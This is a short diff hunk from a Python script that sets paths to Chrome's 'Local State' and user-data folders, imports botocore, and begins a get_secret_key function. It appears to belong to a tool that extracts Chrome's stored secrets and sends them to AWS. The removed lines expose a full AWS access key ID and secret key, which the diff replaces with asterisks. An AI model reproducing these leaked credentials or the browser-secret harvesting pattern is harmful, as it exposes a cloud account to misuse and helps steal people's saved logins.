@@ -14,8 +14,8 @@ from botocore.exceptions import NoCredentialsError
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])
 CHROME_PATH = r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE'])
-ACCESS_KEY = 'AKIAJHW3NPQIZZQSL47A'
-SECRET_KEY = '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'
+ACCESS_KEY = '*************'
+SECRET_KEY = '**************************'
 user = os.environ['USERPROFILE']
 def get_secret_key():
     try:
